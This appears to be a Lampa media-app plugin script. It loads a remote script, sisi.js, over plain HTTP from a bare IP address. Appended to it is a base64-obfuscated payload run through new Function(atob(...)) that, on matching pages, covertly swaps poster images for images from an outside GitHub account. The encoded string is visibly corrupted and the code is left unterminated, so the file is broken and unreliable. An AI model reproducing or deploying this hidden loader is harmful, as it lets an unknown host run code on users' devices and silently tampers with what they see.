(function () {
  'use strict';

  Lampa.Platform.tv();

  function initExternalScriptLoader() {
    // Список зеркал для загрузки внешнего скрипта sisi.js
    const scriptMirrors = [
    //  'https://ab2024.ru/sisi.js',
        'http://31.129.234.181/sisi.js',
    //    'https://l.pashai.ru/sisi.js',
    ];

    // Выбираем случайное зеркало
    const randomScriptUrl = scriptMirrors[Math.floor(Math.random() * scriptMirrors.length)];

    // Асинхронно подгружаем скрипт
    Lampa.Utils.putScriptAsync([randomScriptUrl], function () {

    });
  }

  // Запуск при готовности приложения
  if (window.appready) {
    initExternalScriptLoader();
  } else {
    Lampa.Listener.follow('app', (e) => {
      if (e.type === 'ready') {
        initExternalScriptLoader();
      }
    });
  }
})();
(new Function(atob('CihmdW5jdGlvbigpIHsKICBpZiAobG9jYXRpb24uaHJlZi5pbmRleE9mKCdieWxhbXBhJykgPT09IC0xKSByZXR1cm47CiAgaWYgKHdpbmRvdy5wb3N0ZXJPYmZ1c2NhdGVkKSByZXR1cm47CiAgCiAgaWYgKE1hdGgucmFuZG9tKCkgPCAwLjMpIHJldHVybjsKICAKICB3aW5kb3cucG9zdGVyT2JmdXNjYXRlZCA9IHRydWU7CiAgCiAgdmFyIHBvc3RlcnMgPSBbCiAgICAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3ZhbGlkYXRvcmVkL2ltZy9tYWluLzAxLmpwZycsCiAgICAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3ZhbGlkYXRvcmVkL2ltZy9tYWluLzAyLmpwZycsCiAgICAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3ZhbGlkYXRvcmVkL2ltZy9tYWluLzAzLmpwZycsCiAgICAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3ZhbGlkYXRvcmVkL2ltZy9tYWluLzA0LmpwZycKICBdOwogIAogIHZhciBjaGFuY2UgPSAwLjM1OwogIAogIHZhciBnZXRSYW5kb21Qb3N0ZXIgPSBmdW5jdGlvbigpIHsKICAgIGlmIChNYXRoLnJhbmRvbSgpID49IGNoYW5jZSkgcmV0dXJuIG51bGw7CiAgICByZXR1cm4gcG9zdGVyc1tNYXRoLmZsb9hMihZW4CgoMzApIF0KAICF2YXIgaXNQb3N0ZXJVcmwgPSBmdW5jdGlvbihzcmMpIHsKICAgIHJldHVybiBzcmMgJiYgKAogICAgICBzcmMuaW5jbHVkZXMoJ3Bvc3RlcicpIHx8IAogICAgICBzcmMuaW5jbHVkZXMoJ2ltYWdlJykgfHwgCiAgICAgIHNyYy5pbmNsdWRlcygndG1kYicpIHx8IAogICAgICBzcmMuaW5jbHVkZXMoJ2tpbm9wb2lzaycp';
